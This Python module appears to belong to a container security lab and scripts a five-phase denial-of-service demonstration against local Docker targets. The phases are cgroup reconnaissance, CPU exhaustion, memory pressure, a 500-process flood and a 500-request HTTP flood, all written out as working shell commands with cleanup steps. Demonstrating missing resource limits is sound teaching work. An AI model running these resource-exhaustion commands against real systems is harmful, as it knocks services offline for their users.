import asyncio
from datetime import datetime
from models.attack import AttackRun


ATTACK_COMMANDS = [
    # phase 1: recon — show missing resource limits
    (
        "RECON: cgroup resource limits on flask-target",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- CGROUP RESOURCE LIMITS ---'; "
            "echo -n 'CPU quota  : '; cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null || cat /sys/fs/cgroup/cpu.max 2>/dev/null || echo 'unlimited'; "
            "echo -n 'Memory max : '; cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || cat /sys/fs/cgroup/memory.max 2>/dev/null || echo 'unlimited'; "
            "echo -n 'Pids max   : '; cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || cat /sys/fs/cgroup/pids.max 2>/dev/null || echo 'unlimited'; "
            "echo '(All unlimited → container is unprotected against DoS)'"
        ],
    ),

    # phase 2: cpu exhaustion
    (
        "CPU EXHAUSTION: parallel `yes` workers for 10s",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- CPU EXHAUSTION START ---'; "
            "nproc=$(nproc 2>/dev/null || echo 2); "
            "echo \"Spawning $nproc yes-workers (one per core)...\"; "
            "for i in $(seq 1 $nproc); do timeout 10 yes > /dev/null & done; "
            "sleep 2; "
            "echo '--- CPU USAGE DURING ATTACK ---'; "
            "cat /proc/loadavg; "
            "sleep 8; "
            "pkill -f 'yes' 2>/dev/null; "
            "echo '--- CPU EXHAUSTION DONE (workers killed) ---'"
        ],
    ),

    # phase 3: memory pressure
    (
        "MEMORY PRESSURE: allocate 256 MB inside flask-target",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- MEMORY PRESSURE START ---'; "
            "free -m | head -2; "
            "python3 -c \""
                "import time; "
                "chunks = [bytearray(1024*1024) for _ in range(256)]; "
                "print('Allocated 256 MB — host memory now under pressure'); "
                "import subprocess; "
                "r = subprocess.run(['free','-m'], capture_output=True, text=True); "
                "print(r.stdout.strip()); "
                "time.sleep(3); "
                "del chunks; "
                "print('Released 256 MB')"
            "\"; "
            "echo '--- MEMORY PRESSURE DONE ---'"
        ],
    ),

    # phase 4: process flood
    (
        "PROCESS FLOOD: spawn 500 background processes (fork-bomb class)",
        [
            "docker", "exec", "flask-target",
            "sh", "-c",
            "echo '--- PROCESS FLOOD START ---'; "
            "echo -n 'PID count before: '; cat /proc/sys/kernel/pid_max; "
            "for i in $(seq 1 500); do sleep 30 & done 2>/dev/null; "
            "echo 'Spawned 500 background processes'; "
            "echo -n 'Active sleep procs: '; pgrep -c sleep 2>/dev/null || jobs -l | wc -l; "
            "sleep 1; "
            "pkill -f 'sleep 30' 2>/dev/null; "
            "echo 'Cleaned up all spawned processes'; "
            "echo '--- PROCESS FLOOD DONE ---'"
        ],
    ),

    # phase 5: http flood
    (
        "HTTP FLOOD: 500 concurrent requests attacker → nginx-target",
        [
            "docker", "exec", "attacker",
            "sh", "-c",
            "echo '--- HTTP FLOOD START ---'; "
            "echo 'Firing 500 concurrent GET requests at nginx-target (172.20.0.2)...'; "
            "start=$(date +%s%N); "
            "for i in $(seq 1 500); do "
            "  curl -s -o /dev/null -w '%{http_code}' http://172.20.0.2/ & "
            "done; "
            "wait; "
            "end=$(date +%s%N); "
            "ms=$(( (end - start) / 1000000 )); "
            "echo \"--- HTTP FLOOD DONE: 500 requests in ${ms}ms ---\"; "
            "echo 'nginx-target response check:'; "
            "curl -s -o /dev/null -w 'HTTP %{http_code} in %{time_total}s\\n' http://172.20.0.2/"
        ],
    ),
]


async def run(run: AttackRun, broadcast_fn) -> None:
    for label, cmd in ATTACK_COMMANDS:
        await broadcast_fn(f"[>] PHASE: {label}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        async for line in proc.stdout:
            text = line.decode(errors="replace").rstrip()
            run.output.append(text)
            await broadcast_fn(text)
        await proc.wait()
        if proc.returncode not in (0, None):
            run.exit_code = proc.returncode

    run.finished_at = datetime.utcnow()
    run.exit_code = run.exit_code if run.exit_code is not None else 0
    run.status = "success" if run.exit_code == 0 else "failed"
    run.duration_seconds = (run.finished_at - run.started_at).total_seconds()
    await broadcast_fn(
        f"[+] ATTACK COMPLETE  exit_code={run.exit_code}  duration={run.duration_seconds:.1f}s"
    )
